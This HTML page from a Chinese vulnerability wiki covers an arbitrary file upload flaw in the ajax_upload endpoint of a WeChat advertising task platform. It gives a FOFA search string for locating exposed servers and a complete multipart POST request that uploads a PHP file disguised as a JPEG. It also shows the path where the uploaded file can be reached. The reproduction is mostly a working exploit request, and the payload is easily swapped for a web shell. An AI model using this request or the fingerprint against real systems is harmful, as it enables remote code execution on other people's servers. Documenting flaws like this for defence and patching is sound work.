@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E5%BE%AE%E4%BF%A1%E5%B9%BF%E5%91%8A%E4%BB%BB%E5%8A%A1%E5%B9%B3%E5%8F%B0/%E5%BE%AE%E4%BF%A1%E5%B9%BF%E5%91%8A%E4%BB%BB%E5%8A%A1%E5%B9%B3%E5%8F%B0ajax_upload%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>微信广告任务平台 ajax_upload存在任意文件上传漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "\u5fae\u4fe1\u5e7f\u544a\u4efb\u52a1\u5e73\u53f0 ajax_upload\u5b58\u5728\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e", url: "#_top", children: [
+          ]},
+          {title: "\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb", url: "#_1", children: [
+          ]},
+          {title: "\u4e8c\u3001\u5f71\u54cd\u7248\u672c", url: "#_2", children: [
+          ]},
+          {title: "\u4e09\u3001\u8d44\u4ea7\u6d4b\u7ed8", url: "#_3", children: [
+          ]},
+          {title: "\u56db\u3001\u6f0f\u6d1e\u590d\u73b0", url: "#_4", children: [
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../%E5%BE%AE%E4%BF%A1%E5%B9%BF%E5%91%8A%E4%BB%BB%E5%8A%A1%E5%B9%B3%E5%8F%B0%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../%E5%BE%AE%E4%BF%A1%E5%B9%BF%E5%91%8A%E4%BB%BB%E5%8A%A1%E5%B9%B3%E5%8F%B0%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        微信广告任务平台存在任意文件上传漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7%E5%B0%8F%E8%AF%B4%E6%BC%AB%E7%94%BB%E7%B3%BB%E7%BB%9F/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7%E5%B0%8F%E8%AF%B4%E6%BC%AB%E7%94%BB%E7%B3%BB%E7%BB%9Ffileupload.php%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7%E5%B0%8F%E8%AF%B4%E6%BC%AB%E7%94%BB%E7%B3%BB%E7%BB%9F/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7%E5%B0%8F%E8%AF%B4%E6%BC%AB%E7%94%BB%E7%B3%BB%E7%BB%9Ffileupload.php%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        微信公众号小说漫画系统fileupload.php存在任意文件写入漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="ajax_upload">微信广告任务平台 ajax_upload存在任意文件上传漏洞<a class="headerlink" href="#ajax_upload" title="Permanent link">&para;</a></h1>
+<h1 id="_1">一、漏洞简介<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h1>
+<p>微信广告任务平台ajax_upload存在任意文件上传漏洞，允许攻击者上传恶意文件到服务器，可能导致远程代码执行、网站篡改或其他形式的攻击，严重威胁系统和数据安全。</p>
+<h1 id="_2">二、影响版本<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h1>
+<ul>
+<li>微信广告任务平台</li>
+</ul>
+<h1 id="_3">三、资产测绘<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h1>
+<ul>
+<li>fofa<code>"/tpl/Public/js/func.js"</code></li>
+<li>特征</li>
+</ul>
+<p><img alt="1727407956123-3442212d-99d7-4de5-8733-ed2089d55960.png" src="./img/Y73xFAtkBGmAxNK9/1727407956123-3442212d-99d7-4de5-8733-ed2089d55960-108936.png" /></p>
+<h1 id="_4">四、漏洞复现<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h1>
+<div class="highlight"><pre><span></span><code><span class="n">POST</span><span class="w"> </span><span class="o">/</span><span class="n">index</span><span class="p">.</span><span class="na">php</span><span class="o">/</span><span class="n">Home</span><span class="o">/</span><span class="n">index</span><span class="o">/</span><span class="n">ajax_upload</span><span class="w"> </span><span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
+<span class="nl">Host</span><span class="p">:</span><span class="w"> </span>
+<span class="nl">Connection</span><span class="p">:</span><span class="w"> </span><span class="n">keep</span><span class="o">-</span><span class="n">alive</span>
+<span class="n">Content</span><span class="o">-</span><span class="n">Length</span><span class="p">:</span><span class="w"> </span><span class="mi">197</span>
+<span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="p">:</span><span class="w"> </span><span class="n">multipart</span><span class="o">/</span><span class="n">form</span><span class="o">-</span><span class="n">data</span><span class="p">;</span><span class="w"> </span><span class="n">boundary</span><span class="o">=----</span><span class="n">WebKitFormBoundaryCc7iBZFp1mvojsxn</span>
+<span class="nl">Accept</span><span class="p">:</span><span class="w"> </span><span class="o">*/*</span>
+<span class="nl">Origin</span><span class="p">:</span><span class="w"> </span><span class="n">http</span><span class="p">:</span><span class="c1">//127.0.0.1</span>
+<span class="nl">Referer</span><span class="p">:</span><span class="w"> </span><span class="n">http</span><span class="p">:</span><span class="c1">//127.0.0.1/index.php/Home/Index/index.html</span>
+<span class="nl">Cookie</span><span class="p">:</span><span class="w"> </span><span class="n">think_language</span><span class="o">=</span><span class="n">zh</span><span class="o">-</span><span class="n">CN</span><span class="p">;</span><span class="w"> </span><span class="n">BJYADMIN</span><span class="o">=</span><span class="mi">2150</span><span class="n">gjbkj92r835kg2dn9u9i75</span>
+<span class="n">User</span><span class="o">-</span><span class="n">Agent</span><span class="p">:</span><span class="w"> </span><span class="n">Mozilla</span><span class="o">/</span><span class="mf">5.0</span><span class="w"> </span><span class="p">(</span><span class="n">Windows</span><span class="w"> </span><span class="n">NT</span><span class="w"> </span><span class="mf">10.0</span><span class="p">;</span><span class="w"> </span><span class="n">Win64</span><span class="p">;</span><span class="w"> </span><span class="n">x64</span><span class="p">)</span><span class="w"> </span><span class="n">AppleWebKit</span><span class="o">/</span><span class="mf">537.36</span><span class="w"> </span><span class="p">(</span><span class="n">KHTML</span><span class="p">,</span><span class="w"> </span><span class="n">like</span><span class="w"> </span><span class="n">Gecko</span><span class="p">)</span><span class="w"> </span><span class="n">Chrome</span><span class="o">/</span><span class="mf">90.0.0.0</span><span class="w"> </span><span class="n">Safari</span><span class="o">/</span><span class="mf">537.36</span>
+
+<span class="o">------</span><span class="n">WebKitFormBoundaryCc7iBZFp1mvojsxn</span>
+<span class="n">Content</span><span class="o">-</span><span class="n">Disposition</span><span class="p">:</span><span class="w"> </span><span class="n">form</span><span class="o">-</span><span class="n">data</span><span class="p">;</span><span class="w"> </span><span class="n">name</span><span class="o">=</span><span class="s">&quot;file&quot;</span><span class="p">;</span><span class="w"> </span><span class="n">filename</span><span class="o">=</span><span class="s">&quot;1.php&quot;</span>
+<span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="p">:</span><span class="w"> </span><span class="n">image</span><span class="o">/</span><span class="n">jpeg</span>
+
+<span class="o">&lt;?</span><span class="n">php</span><span class="w"> </span><span class="nf">phpinfo</span><span class="p">();</span><span class="o">?&gt;</span>
+<span class="o">------</span><span class="n">WebKitFormBoundaryCc7iBZFp1mvojsxn</span><span class="o">--</span>
+</code></pre></div>
+<p><img alt="1727407992383-97ec806a-1961-4feb-b6c8-f3df0bde519b.png" src="./img/Y73xFAtkBGmAxNK9/1727407992383-97ec806a-1961-4feb-b6c8-f3df0bde519b-364394.png" /></p>
+<div class="highlight"><pre><span></span><code><span class="nl">https</span><span class="p">:</span><span class="c1">//xxxx/Uploads/images/2024-09-27/66f626b7a5af8.php</span>
+</code></pre></div>
+<p><img alt="1727408017462-be496d1f-b3c1-4344-bdbd-fc1f41b87e83.png" src="./img/Y73xFAtkBGmAxNK9/1727408017462-be496d1f-b3c1-4344-bdbd-fc1f41b87e83-782850.png" /></p>
+<blockquote>
+<p>更新: 2024-10-22 09:36:08<br />
+原文: <a href="https://www.yuque.com/xiaokp7/ocvun2/zhsn7ptr9pmr61nd">https://www.yuque.com/xiaokp7/ocvun2/zhsn7ptr9pmr61nd</a></p>
+</blockquote>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../%E5%BE%AE%E4%BF%A1%E5%B9%BF%E5%91%8A%E4%BB%BB%E5%8A%A1%E5%B9%B3%E5%8F%B0%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../%E5%BE%AE%E4%BF%A1%E5%B9%BF%E5%91%8A%E4%BB%BB%E5%8A%A1%E5%B9%B3%E5%8F%B0%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        微信广告任务平台存在任意文件上传漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7%E5%B0%8F%E8%AF%B4%E6%BC%AB%E7%94%BB%E7%B3%BB%E7%BB%9F/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7%E5%B0%8F%E8%AF%B4%E6%BC%AB%E7%94%BB%E7%B3%BB%E7%BB%9Ffileupload.php%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7%E5%B0%8F%E8%AF%B4%E6%BC%AB%E7%94%BB%E7%B3%BB%E7%BB%9F/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7%E5%B0%8F%E8%AF%B4%E6%BC%AB%E7%94%BB%E7%B3%BB%E7%BB%9Ffileupload.php%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        微信公众号小说漫画系统fileupload.php存在任意文件写入漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
